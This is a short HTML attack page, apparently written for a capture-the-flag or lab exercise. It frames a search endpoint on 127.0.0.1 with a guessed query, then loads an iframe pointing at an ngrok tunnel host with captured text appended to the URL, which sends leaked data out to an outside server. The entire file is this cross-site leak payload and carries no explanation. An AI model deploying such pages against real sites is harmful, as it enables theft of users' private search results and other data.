
<html>
    <head>
        <script>
                  let text = "TEST";
            
            const afterLoad = function() {
                  const iframe = document.createElement("iframe")

                  iframe.src = "https://nonspirited-zoie-bilocular.ngrok-free.dev/" + text
                  document.body.append(iframe)
              }
          </script>
    </head> 
      <body>
            
          <iframe src="http://127.0.0.1:8000/search?query=D" id="query" onerror="afterLoad()" onload="afterLoad()">
              <script>
                text = document.getElementsByTagName("pre")[0].textContent || "TQ"
            </script>
          </iframe>
      </body>
</html>
